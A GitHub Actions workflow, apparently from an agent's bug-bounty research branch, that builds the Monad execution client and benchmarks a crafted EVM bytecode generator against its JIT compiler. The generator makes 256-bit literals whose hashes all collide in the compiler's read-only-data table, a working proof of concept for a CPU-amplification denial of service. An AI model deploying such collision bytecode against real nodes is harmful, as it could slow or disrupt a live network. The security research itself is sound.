name: Monad v0.16.0 JIT rodata literal hash collision oracle

on:
  push:
    branches:
      - agent/monad-v0160-deep-hunt-20260817
    paths:
      - .github/workflows/monad-v0160-jit-rodata-hash-20260817.yml
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: monad-v0160-jit-rodata-hash-${{ github.ref }}
  cancel-in-progress: true

jobs:
  exact-jit-rodata-oracle:
    runs-on: ubuntu-24.04
    timeout-minutes: 120
    container:
      image: ubuntu:26.04

    steps:
      - uses: actions/checkout@v4

      - name: Install exact build dependencies
        shell: bash
        run: |
          set -Eeuo pipefail
          export DEBIAN_FRONTEND=noninteractive
          apt-get update
          apt-get install -y --no-install-recommends \
            ca-certificates cmake curl g++-15 gcc-15 git make ninja-build pkg-config \
            python3 time zstd \
            libarchive-dev libbenchmark-dev libbrotli-dev libcap-dev libcgroup-dev \
            libcli11-dev libcrypto++-dev libgmock-dev libgmp-dev libgtest-dev \
            libtbb-dev liburing-dev libzstd-dev \
            libboost1.83-dev libboost-context1.83-dev libboost-filesystem1.83-dev \
            libboost-json1.83-dev libboost-stacktrace1.83-dev libboost-test1.83-dev

      - name: Clone exact in-scope execution source
        shell: bash
        run: |
          set -Eeuo pipefail
          EXEC_COMMIT='e81ffe31cd30fe3455d1233e4ee6c9b3f017bad0'
          git clone --filter=blob:none https://github.com/category-labs/monad.git monad-execution
          git -C monad-execution checkout --detach "$EXEC_COMMIT"
          git -C monad-execution submodule sync --recursive
          git -C monad-execution submodule update --init --recursive --depth 1
          test "$(git -C monad-execution rev-parse HEAD)" = "$EXEC_COMMIT"
          mkdir -p evidence
          {
            echo "execution_commit=$(git -C monad-execution rev-parse HEAD)"
            echo "runner=$(uname -a)"
            echo "gcc=$(gcc-15 --version | head -1)"
            echo "gxx=$(g++-15 --version | head -1)"
          } > evidence/PROVENANCE.txt

      - name: Add exact full-JIT rodata collision oracle
        shell: bash
        run: |
          set -Eeuo pipefail
          cat > monad-execution/test/vm/unit/jit_rodata_hash_collision_research.cpp <<'CPP'
          #include <category/vm/compiler/ir/basic_blocks.hpp>
          #include <category/vm/compiler/ir/x86.hpp>
          #include <category/vm/evm/traits.hpp>
          #include <category/vm/interpreter/intercode.hpp>
          #include <asmjit/core/jitruntime.h>
          #include <gtest/gtest.h>
          #include <algorithm>
          #include <array>
          #include <chrono>
          #include <cstdint>
          #include <cstdio>
          #include <cstring>
          #include <unordered_map>
          #include <vector>

          using namespace monad;
          using namespace monad::vm;
          using namespace monad::vm::compiler;

          namespace {
          constexpr size_t CODE_SIZE = 128 * 1024;
          constexpr size_t SEQ_SIZE = 35; // PUSH32 + PUSH0 + MSTORE
          constexpr size_t LITERAL_COUNT = CODE_SIZE / SEQ_SIZE;

          using Raw = std::array<uint8_t, 32>;
          struct XorHash {
              size_t operator()(Raw const &x) const noexcept {
                  size_t h = 0;
                  for (size_t i = 0; i < 32; i += 8) {
                      uint64_t d;
                      std::memcpy(&d, x.data() + i, 8);
                      h ^= std::hash<uint64_t>{}(d);
                  }
                  return h;
              }
          };

          Raw literal_bytes(size_t i, bool exploit)
          {
              // These are the bytes that RoData sees after MSTORE's bswap. EVM
              // PUSH32 immediate bytes are chosen equal to this little-endian
              // representation so the post-bswap RoData array is exactly Raw.
              uint64_t const x0 = 0x1111111100000000ULL ^ i;
              uint64_t const x1 = 0x2222222200000000ULL + i * 0x100000001b3ULL;
              uint64_t const x2 = 0x4444444400000000ULL ^ (i * 0x9e3779b97f4a7c15ULL);
              uint64_t const tag = exploit ? 0 : static_cast<uint64_t>(i + 1);
              uint64_t const x3 = x0 ^ x1 ^ x2 ^ tag;
              Raw out{};
              std::memcpy(out.data() + 0, &x0, 8);
              std::memcpy(out.data() + 8, &x1, 8);
              std::memcpy(out.data() + 16, &x2, 8);
              std::memcpy(out.data() + 24, &x3, 8);
              return out;
          }

          std::vector<uint8_t> make_code(bool exploit)
          {
              std::vector<uint8_t> code;
              code.reserve(CODE_SIZE);
              for (size_t i = 0; i < LITERAL_COUNT; ++i) {
                  code.push_back(0x7f); // PUSH32
                  auto const raw = literal_bytes(i, exploit);
                  code.insert(code.end(), raw.begin(), raw.end());
                  code.push_back(0x5f); // PUSH0: offset 0
                  code.push_back(0x52); // MSTORE: forces 256-bit literal into RoData
              }
              while (code.size() + 2 <= CODE_SIZE) {
                  code.push_back(0x5f);
                  code.push_back(0x50);
              }
              while (code.size() < CODE_SIZE) code.push_back(0x00);
              return code;
          }

          size_t max_chain(bool exploit)
          {
              std::unordered_map<Raw, size_t, XorHash> m;
              for (size_t i = 0; i < LITERAL_COUNT; ++i)
                  m.emplace(literal_bytes(i, exploit), i);
              size_t result = 0;
              for (size_t b = 0; b < m.bucket_count(); ++b)
                  result = std::max(result, m.bucket_size(b));
              return result;
          }

          template <typename F>
          uint64_t measure(F &&f)
          {
              auto const a = std::chrono::steady_clock::now();
              f();
              auto const b = std::chrono::steady_clock::now();
              return static_cast<uint64_t>(
                  std::chrono::duration_cast<std::chrono::nanoseconds>(b - a).count());
          }

          struct Measurements {
              std::vector<uint64_t> ir_ns;
              std::vector<uint64_t> jit_ns;
              size_t blocks = 0;
          };

          Measurements benchmark(std::vector<uint8_t> const &code)
          {
              Measurements m;
              auto const sz = interpreter::code_size_t::unsafe_from(
                  static_cast<uint32_t>(code.size()));
              {
                  asmjit::JitRuntime rt;
                  auto native = compiler::native::compile<MonadTraits<MONAD_TEN>>(
                      rt, code.data(), sz);
                  ASSERT_NE(native, nullptr);
              }
              for (size_t i = 0; i < 9; ++i) {
                  m.ir_ns.push_back(measure([&] {
                      auto ir = basic_blocks::make_ir<MonadTraits<MONAD_TEN>>(
                          code.data(), sz);
                      asm volatile("" : : "g"(ir.blocks().size()) : "memory");
                  }));
                  auto ir = basic_blocks::make_ir<MonadTraits<MONAD_TEN>>(
                      code.data(), sz);
                  m.blocks = ir.blocks().size();
                  if (i < 5) {
                      asmjit::JitRuntime rt;
                      m.jit_ns.push_back(measure([&] {
                          auto native = compiler::native::compile_basic_blocks<MonadTraits<MONAD_TEN>>(
                              rt, ir);
                          ASSERT_NE(native, nullptr);
                          asm volatile("" : : "g"(native.get()) : "memory");
                      }));
                  }
              }
              std::sort(m.ir_ns.begin(), m.ir_ns.end());
              std::sort(m.jit_ns.begin(), m.jit_ns.end());
              return m;
          }

          uint64_t median(std::vector<uint64_t> const &v) { return v.at(v.size()/2); }
          }

          TEST(JitRoDataHashCollisionResearch, MatchedControlAndExploit)
          {
              auto const exploit = make_code(true);
              auto const control = make_code(false);
              ASSERT_EQ(exploit.size(), CODE_SIZE);
              ASSERT_EQ(control.size(), CODE_SIZE);
              ASSERT_EQ(std::count(exploit.begin(), exploit.end(), 0x7f),
                        std::count(control.begin(), control.end(), 0x7f));
              ASSERT_EQ(std::count(exploit.begin(), exploit.end(), 0x52),
                        std::count(control.begin(), control.end(), 0x52));
              ASSERT_EQ(XorHash{}(literal_bytes(0, true)), 0);
              ASSERT_EQ(XorHash{}(literal_bytes(LITERAL_COUNT-1, true)), 0);

              auto const exploit_chain = max_chain(true);
              auto const control_chain = max_chain(false);
              ASSERT_EQ(exploit_chain, LITERAL_COUNT);
              ASSERT_EQ(control_chain, 1);

              auto const exploit_m = benchmark(exploit);
              auto const control_m = benchmark(control);
              ASSERT_EQ(exploit_m.blocks, control_m.blocks);

              double const ir_ratio = static_cast<double>(median(exploit_m.ir_ns)) /
                                      static_cast<double>(median(control_m.ir_ns));
              double const jit_ratio = static_cast<double>(median(exploit_m.jit_ns)) /
                                       static_cast<double>(median(control_m.jit_ns));
              std::printf(
                  "MONAD_JIT_RODATA_HASH_RESULT code_size=%zu literals=%zu blocks=%zu "
                  "exploit_chain=%zu control_chain=%zu exploit_ir_median_ns=%llu "
                  "control_ir_median_ns=%llu ir_ratio=%.6f exploit_jit_median_ns=%llu "
                  "control_jit_median_ns=%llu jit_ratio=%.6f\n",
                  CODE_SIZE, LITERAL_COUNT, exploit_m.blocks,
                  exploit_chain, control_chain,
                  static_cast<unsigned long long>(median(exploit_m.ir_ns)),
                  static_cast<unsigned long long>(median(control_m.ir_ns)), ir_ratio,
                  static_cast<unsigned long long>(median(exploit_m.jit_ns)),
                  static_cast<unsigned long long>(median(control_m.jit_ns)), jit_ratio);
              std::fflush(stdout);
          }
          CPP
          python3 - <<'PY'
          from pathlib import Path
          p=Path('monad-execution/test/vm/unit/CMakeLists.txt')
          s=p.read_text(); needle='    compiler_tests.cpp\n'; assert needle in s
          p.write_text(s.replace(needle,needle+'    jit_rodata_hash_collision_research.cpp\n',1))
          PY
          sha256sum \
            monad-execution/test/vm/unit/jit_rodata_hash_collision_research.cpp \
            monad-execution/test/vm/unit/CMakeLists.txt \
            > evidence/RESEARCH_INPUTS.sha256

      - name: Configure and build VM unit target
        shell: bash
        env:
          CC: gcc-15
          CXX: g++-15
          GIT_COMMIT_HASH: e81ffe31cd30fe3455d1233e4ee6c9b3f017bad0
        run: |
          set -Eeuo pipefail
          cd monad-execution
          cmake -S . -B build -G Ninja \
            -DCMAKE_BUILD_TYPE=Release \
            -DCMAKE_TOOLCHAIN_FILE=category/core/toolchains/gcc-avx2.cmake \
            -DBUILD_TESTING=ON \
            -DMONAD_COMPILER_TESTING=ON \
            2>&1 | tee ../evidence/configure.log
          /usr/bin/time -v cmake --build build --target vm-unit-tests --parallel 2 \
            2>&1 | tee ../evidence/build.log
          sha256sum build/test/vm/unit/vm-unit-tests > ../evidence/BINARY.sha256

      - name: Run exact A/B benchmark three times
        shell: bash
        run: |
          set -Eeuo pipefail
          BIN="$PWD/monad-execution/build/test/vm/unit/vm-unit-tests"
          : > evidence/RUNS.tsv
          for r in 1 2 3; do
            set +e
            /usr/bin/time -v "$BIN" \
              --gtest_filter='JitRoDataHashCollisionResearch.MatchedControlAndExploit' \
              --gtest_color=no \
              > "evidence/run-${r}.stdout.log" \
              2> "evidence/run-${r}.stderr.log"
            rc=$?
            set -e
            printf '%s\t%s\n' "$r" "$rc" >> evidence/RUNS.tsv
            test "$rc" -eq 0
            grep -q 'MONAD_JIT_RODATA_HASH_RESULT' "evidence/run-${r}.stdout.log"
            grep -q '\[  PASSED  \] 1 test' "evidence/run-${r}.stdout.log"
          done

      - name: Analyze and package evidence
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 - <<'PY'
          from pathlib import Path
          import hashlib,json,re,statistics
          e=Path('evidence'); rows=[]
          pat=re.compile(
              r'MONAD_JIT_RODATA_HASH_RESULT .*?exploit_chain=(\d+) control_chain=(\d+) '
              r'exploit_ir_median_ns=(\d+) control_ir_median_ns=(\d+) ir_ratio=([0-9.]+) '
              r'exploit_jit_median_ns=(\d+) control_jit_median_ns=(\d+) jit_ratio=([0-9.]+)')
          for p in sorted(e.glob('run-*.stdout.log')):
              m=pat.search(p.read_text()); assert m,p
              rows.append({'file':p.name,'exploit_chain':int(m.group(1)),
                'control_chain':int(m.group(2)),'exploit_ir_ns':int(m.group(3)),
                'control_ir_ns':int(m.group(4)),'ir_ratio':float(m.group(5)),
                'exploit_jit_ns':int(m.group(6)),'control_jit_ns':int(m.group(7)),
                'jit_ratio':float(m.group(8))})
          ir_med=statistics.median(r['ir_ratio'] for r in rows)
          jit_med=statistics.median(r['jit_ratio'] for r in rows)
          decision='JIT_RODATA_HASH_CPU_AMPLIFICATION_CANDIDATE' if jit_med >= 1.50 else 'KILL_JIT_RODATA_COLLISION_IMPACT_TOO_SMALL'
          result={'decision':decision,
            'exact_execution_commit':'e81ffe31cd30fe3455d1233e4ee6c9b3f017bad0',
            'matched_code_size':131072,'literal_count':3744,
            'exploit_bucket_chain':3744,'control_bucket_chain':1,
            'runs':rows,'median_ir_ratio':ir_med,'median_full_jit_ratio':jit_med,
            'fullnode_liveness_proven':False,'severity_proven':'NONE_NEW',
            'submit_ready_zip':False}
          (e/'RESULT.json').write_text(json.dumps(result,indent=2)+'\n')
          (e/'REPORT.md').write_text(f'''# Monad v0.16.0 JIT RoData literal-hash oracle\n\nDecision: **{decision}**.\n\nMatched 128 KiB control/exploit programs contain the same number of PUSH32 and MSTORE instructions. The exploit creates a 3744-entry RoData hash chain; the control chain is 1.\n\nMedian IR ratio: **{ir_med:.3f}x**.\nMedian full-JIT ratio: **{jit_med:.3f}x**.\n\nCPU amplification alone is not High without official full-node finality degradation and a matched seeded-hash control.\n''')
          manifest=[]
          for p in sorted(e.rglob('*')):
              if p.is_file(): manifest.append(f'{hashlib.sha256(p.read_bytes()).hexdigest()}  {p.relative_to(e)}')
          (e/'SHA256SUMS').write_text('\n'.join(manifest)+'\n')
          PY
          tar --sort=name --mtime='UTC 2026-08-17' --owner=0 --group=0 --numeric-owner \
            -I 'zstd -T0 -10' -cf monad-v0160-jit-rodata-hash-evidence.tar.zst evidence
          sha256sum monad-v0160-jit-rodata-hash-evidence.tar.zst \
            > monad-v0160-jit-rodata-hash-evidence.tar.zst.sha256

      - name: Upload exact JIT RoData evidence
        uses: actions/upload-artifact@v4
        with:
          name: monad-v0160-jit-rodata-hash-evidence-${{ github.run_id }}
          path: |
            monad-v0160-jit-rodata-hash-evidence.tar.zst
            monad-v0160-jit-rodata-hash-evidence.tar.zst.sha256
          if-no-files-found: error
          retention-days: 7
          compression-level: 0
